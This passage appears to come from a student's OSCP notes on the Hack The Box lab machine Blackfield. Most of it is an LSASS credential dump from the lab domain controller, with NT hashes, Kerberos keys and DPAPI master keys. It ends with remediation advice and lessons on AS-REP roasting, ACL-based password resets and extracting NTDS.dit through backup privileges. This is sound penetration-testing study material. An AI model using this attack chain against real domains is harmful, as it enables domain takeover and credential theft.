		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [59839]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 256940 (3ebac)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.068835+00:00
sid S-1-5-18
luid 256940
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 136764 (2163c)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.052945+00:00
sid S-1-5-18
luid 136764
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 134935 (20f17)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.834285+00:00
sid S-1-5-18
luid 134935
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server
logon_time 2020-02-23T17:57:47.162285+00:00
sid S-1-5-19
luid 997
	== Kerberos ==
		Username:
		Domain:

== LogonSession ==
authentication_id 24405 (5f55)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-0
luid 24405
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5f55]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [5f55]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24294 (5ee6)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-0
luid 24294
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5ee6]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [5ee6]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24282 (5eda)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-1
luid 24282
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5eda]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [5eda]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 22028 (560c)
session_id 0
username
domainname
logon_server
logon_time 2020-02-23T17:57:44.959593+00:00
sid None
luid 22028
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:44.913221+00:00
sid S-1-5-18
luid 999
	== WDIGEST [3e7]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: dc01$
		Domain: BLACKFIELD.LOCAL
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: ae7032a985fe7303c182f82d15df15b1ccf731c7f33947e3bd2f193d12d9d684
	== WDIGEST [3e7]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [3e7]==
		luid 999
		key_guid 0f7e926c-c502-4cad-90fa-32b78425b5a9
		masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
		sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
	== DPAPI [3e7]==
		luid 999
		key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
		masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
		sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
	== DPAPI [3e7]==
		luid 999
		key_guid 31632c55-7a7c-4c51-9065-65469950e94e
		masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
		sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
	== DPAPI [3e7]==
		luid 999
		key_guid 7e0da320-072c-4b4a-969f-62087d9f9870
		masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
		sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Blackfield | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Anonymous SMB access can expose usernames even when anonymous LDAP and RPC enumeration are empty.
- AS-REP roasting requires Kerberos pre-authentication to be disabled on the target account, so test this whenever a username list is available.
- `netexec ldap --asreproast` is a reliable fallback when `GetNPUsers.py` has a local version conflict. Add `--port 389` when LDAPS is not confirmed.
- ForceChangePassword is a direct password-reset permission and does not require the old password.
- The ForceChangePassword extended right is represented by ACE GUID `00299570-246d-11d0-a768-00aa006e0529`.
- A BloodHound GUI failure does not invalidate the collection. Direct ACL tools can identify the same path.
- Cached credentials from LSASS may be stale. Validate them before committing to a branch.
- Backup Operators and SeBackupPrivilege can expose NTDS without a Kerberos DCSync path.
- DiskShadow scripts need CRLF line endings when created on Linux.
- NTDS.dit contains domain hashes. SAM alone would not provide the domain database on a domain controller.
- A local Impacket packaging failure can be bypassed with the working pipx installation.
- NTDS.dit is the authoritative source for Administrator NT hashes. The LSASS-cached hash may be stale if the password changed after the last interactive logon.

- Share permissions can expose both usernames and forensic artifacts before authentication.
- Backup privileges can be more valuable than an ordinary administrator group membership because they bypass file-read checks.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- shares a similar enumeration or escalation pattern

## External resources

- [HackTricks: AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [HackTricks: Abusing Backup Operators](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)
- [HackTricks: DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [HackTricks: Pass the Hash](https://book.hacktricks.xyz/windows-hardening/ntlm/pass-the-hash)
- [PayloadsAllTheThings: Active Directory ACL Abuse](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#acl-abuse)
- [PayloadsAllTheThings: NTDS Extraction](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ntds)
- [LOLBAS: DiskShadow](https://lolbas-project.github.io/lolbas/Binaries/Diskshadow/)
- [ippsec: Blackfield](https://ippsec.rocks/?#Blackfield)

## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]
- [[RUNBOOK V2/Linux - Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum]]
- [[RUNBOOK V2/Linux - Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum]]
- [[RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
